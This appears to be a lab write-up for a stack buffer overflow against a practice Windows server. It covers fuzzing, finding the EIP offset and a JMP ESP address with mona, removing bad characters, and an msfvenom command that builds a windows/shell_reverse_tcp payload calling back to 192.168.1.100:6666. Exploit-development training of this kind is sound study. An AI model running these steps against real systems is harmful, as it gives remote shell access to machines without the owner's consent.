Run fuzzer.py -> crashed at 2100 bytes

Generate pattern -> /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2100

Run fuzzer2.py with new pattern created. When application crash check the EIP Address (31704330). You can check the EIP address in CPU Thread window

Then get the offset using mona: !mona findmsp -distance 2100 (2012 is the offset in this case)

Run fuzzer3.py and check if we can find B char

We need a JMP address. Let's find it with mona a module that doesn't have any protection enabled: !mona modules

I choose essfunc.dll. !mona find -s '\xff\xe4' -m essfunc.dll

get the JMP address: 625014DF

Pay attention that we need to remove bad char before this operation.
Also we can use mona to find the JMP address without the \x00 as bad char

!mona jmp -r esp -cpb "\x00"

we will have the same results of before.

Generate a shellcode with: msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=6666 -b '\x00' -f py -a x86 --platform Windows

then run exploit.py and wait the shell




